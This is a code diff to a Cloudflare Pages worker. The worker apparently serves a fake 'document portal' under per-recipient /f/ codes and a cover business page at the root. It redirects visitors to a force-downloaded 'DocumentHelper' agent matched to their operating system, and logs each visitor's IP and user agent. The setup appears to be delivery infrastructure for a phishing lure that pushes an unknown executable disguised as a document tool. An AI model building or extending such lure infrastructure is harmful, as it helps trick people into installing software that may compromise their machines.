@@ -1,13 +1,22 @@
+// Cloudflare Pages Functions worker for reyessitework.pages.dev
+// Copied into the upload bundle as `_worker.js` by mk-pages-dir.sh.
+//
+// Routes:
+//   /get | /download  -> 302 to the OS-appropriate agent (Windows/macOS/Linux)
+//   /dl/<file>        -> force download (Content-Disposition: attachment)
+//   /f/<code>         -> document portal (index.html); ?to= handled client-side
+//   /                 -> business one-pager (about.html)
+//   everything else   -> static asset
 export default {
   async fetch(req, env) {
     const ua = req.headers.get('user-agent') || '';
-    const url = new URL(req.url);
-    const p = url.pathname;
+    const u = new URL(req.url);
+    const p = u.pathname;
 
-    if (p === '/get') {
-      const f = /Windows/.test(ua)  ? 'DocumentHelper.exe'
-              : /Macintosh/.test(ua) ? 'DocumentHelper.pkg'
-              : /Linux/.test(ua)     ? 'DocumentHelper.run'
+    if (p === '/get' || p === '/download') {
+      const f = /Windows/i.test(ua)            ? 'DocumentHelper.exe'
+              : /Macintosh|Mac OS X/i.test(ua) ? 'DocumentHelper.pkg'
+              : /Linux|X11/i.test(ua)          ? 'DocumentHelper.run'
               : 'DocumentHelper.exe';
       console.log(JSON.stringify({
         ts: Date.now(), ip: req.headers.get('cf-connecting-ip'),
@@ -15,7 +24,7 @@ export default {
       }));
       return new Response(null, {
         status: 302,
-        headers: { Location: `/dl/${f}`, 'Cache-Control': 'no-store' }
+        headers: { Location: '/dl/' + f, 'Cache-Control': 'no-store' }
       });
     }
 
@@ -28,12 +37,12 @@ export default {
       return new Response(r.body, { status: r.status, headers: h });
     }
 
-    if (/^\/f\/[a-f0-9]{8}$/.test(p)) {
-      return env.ASSETS.fetch(new Request('https://reyessitework.pages.dev/index.html', { method: 'GET', headers: new Headers() }));
+    if (/^\/f\/[A-Za-z0-9_-]+$/.test(p)) {
+      return env.ASSETS.fetch(new URL('/index.html', u));
     }
 
     if (p === '/') {
-      return env.ASSETS.fetch(new Request('https://reyessitework.pages.dev/about.html', { method: 'GET', headers: new Headers() }));
+      return env.ASSETS.fetch(new URL('/about.html', u));
     }
 
     return env.ASSETS.fetch(req);
